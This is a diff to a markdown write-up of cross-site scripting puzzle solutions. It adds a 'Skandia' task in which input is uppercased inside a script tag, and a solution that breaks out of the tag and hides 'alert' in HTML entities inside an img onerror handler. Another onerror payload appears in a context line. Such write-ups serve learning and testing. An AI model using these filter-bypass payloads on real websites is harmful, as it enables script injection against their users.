@@ -132,7 +132,23 @@ function escape(s) {
 [[x|http://onerror=javascript:alert(1)//]]
 ```
 
-## JSON2
+### Skandia
+
+- Task
+
+```js
+function escape(s) {
+  return '<script>console.log("' + s.toUpperCase() + '")</script>';
+}
+```
+
+- Solution
+
+```js
+</script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+```
+
+### JSON2
 
 - Task
 
